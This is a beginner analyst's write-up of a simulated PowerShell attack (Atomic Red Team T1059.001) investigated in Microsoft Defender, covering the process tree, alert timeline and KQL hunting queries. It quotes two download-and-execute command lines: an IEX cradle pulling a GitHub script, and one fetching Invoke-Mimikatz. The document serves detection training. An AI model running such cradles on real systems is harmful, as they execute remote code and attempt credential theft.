# PowerShell Attack Investigation – T1059.001

I wanted to share how I approached this investigation, the steps I took, my thought process and what I learned throughout the analysis.

I picked T1059.001 PowerShell Technique because powershell is mainly used by IT so seeing it run under a normal user like Jenny looks suspicious and is a good place for a beginner to start hunting.

Lets Go.

## 5 Prepared Questions

Before I looked at the alerts I had already prepared five questions that I wanted to start my investigation:

1. What connects these alerts?
2. Which alert came first?
3. What actually ran?
4. Who did it?
5. What happened next?

## The Process Tree – My Findings

This part was a bit confusing at first because as shown in the screenshot, it looks like [pid 14920] powershell.exe launched [pid 8540] cmd.exe. But after checking the timestamps, I realised that [pid 14920] powershell.exe belonged to an earlier user session. The real chain of events was that [pid 8540] cmd.exe created [pid 12236] powershell.exe, which then used DownloadString with IEX (Invoke-Expression) to pull a script from GitHub and run it directly as PowerShell code. This confirmed that the root cause was an interactive PowerShell session started by Jenny’s remote login, not an automated task or background service. That was the point where the simulated attack really began.

[View Process Tree](Process-Tree.PNG)



## The Process Tree – What I Learnt

Looking at the process tree, I realised it shows activity that started before the actual attack time. That is because it includes the parent processes, helping you see exactly how the suspicious one was launched. In this case, PowerShell was started interactively under Jenny’s session, not by a background service. Seeing explorer.exe as the parent process confirmed it came from user activity rather than persistence or an automatic startup.

I also found it helpful that the process tree highlights Remote Execution for the chain userinit.exe > explorer.exe > powershell.exe, showing the action took place within an RDP session.

I also noticed that Defender had blocked and resolved several related threats that never appeared on the alert summary although they were displayed in the Process Tree and Incidents. So because Defender stopped the threats before they were executed, it marked them as resolved, which means they no longer required further action and therefore did not show up in the Alerts summary for triage.

## The Alert Timeline – My Findings

### Alert 1: Suspicious PowerShell Command Line

At first I just saw a long PowerShell command but then I realised why Defender flagged it. It had some red flags like IEX (Invoke-Expression), the DownloadString which pulls the GitHub code from the internet and the -exec bypass flag.

Here’s the command Defender caught:

```text
powershell.exe -exec bypass -noprofile "$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1',$False);$comMsXml.Send();IEX $comMsXml.ResponseText"
```

The remote session came from 192.168.1.72, logged in as AzureAD\JennySmith.

[View Alert Timeline – Suspicious PowerShell Command Line](Alert-Timeline-Suspicious-Powershell-Command-Line.PNG)


### Alert 2: Suspicious Process Executed PowerShell Command

The details in this alert looked almost identical to the first one however they both tell different things.  
Alert 1 is that Defender noticed a suspicious command.  
Alert 2 confirms that the suspicious command was actually executed.

### Alert 3: Mimikatz Credential Theft Tool

The previous alerts led up to this big one which was the main goal of the attacker. Defender confirmed the suspicious command tried to run the Mimikatz tool, which is known for stealing passwords from memory. The command showed PowerShell trying to download and run the script from GitHub. Defender caught it straight away and marked it as Trojan:PowerShell/Mimikatz.A, blocking it before it could dump any credentials.

The command looked like this:

```text
C:\Windows\System32\cmd.exe /c powershell.exe IEX (New-Object Net.WebClient).DownloadString(...Invoke-Mimikatz.ps1)
```

[View Alert – Mimikatz Credential Theft Tool](Alert-Mimikatz-Credential-Theft-Tool.PNG)



## Advanced Hunting – KQL

So far the Process Tree and Timeline have shown the story that started with a suspicious PowerShell command, then the process actually ran during Jenny’s RDP session, and finally it tried to execute Mimikatz to steal credentials but Defender stopped it. However I was keen to investigate the endpoints further and validate the alerts.

I have listed the following 4 KQL queries here : [View KQL Queries](../KQL/KQL-Queries.kql)



### KQL Query 1 – Confirm PowerShell Execution

The KQL query on DeviceProcessEvents confirmed that at 16:05 BST, Jenny’s VM executed powershell.exe from cmd.exe using the IEX and DownloadString to pull a script from GitHub. This aligns exactly with the Defender alerts for suspicious PowerShell activity and validates that the simulated T1059.001 attack produced real telemetry.

[View KQL Query Results – Confirm PowerShell Execution](../KQL/KQL-Query-Confirm-Poweshell-Execution.PNG)


At this point, I already had all the answers I needed as far as the simulated attack goes. However I wanted to dig deeper and practise using KQL as if this was a real investigation.

### KQL Query 2 – Look For Mimikatz

This was really interesting! I hunted for the string Invoke-Mimikatz and I got **No Results!** How is this possible when we have already confirmed the attacker’s DownloadString contained Invoke-Mimikatz?

It’s because the malicious code was blocked and never actually ran so there are no logs for it. This is very important to know that Defender Alerts are based on detection and the endpoint telemetry is not the same!

### KQL Query 3 – Look For Spread of the PowerShell Activity

The results showed that only one device ran the suspicious PowerShell command. This was expected because I had only onboarded one endpoint to Defender. I just wanted to practise building the KQL queries.

[View KQL Query Results – Confirm PowerShell Execution](../KQL/KQL-Spread-Powershell-Activity.PNG)

### KQL Query 4 – Look For Persistence

My persistence query came back with no results is because the Atomic Red Team simulation (T1059.001) was only designed to test PowerShell execution, not persistence. It launched a suspicious PowerShell command that Defender detected and blocked straight away, so it never went on to create any scheduled tasks or user accounts.

## Final Note

I really enjoyed this investigation and found it a great way to put what I have been learning into practice. I tried to make the most of the challenge by treating it like a real attack instead of a simulation so that I could go further. I am developing my analyst skills through the MyDFIR Skool by Steven Mah.
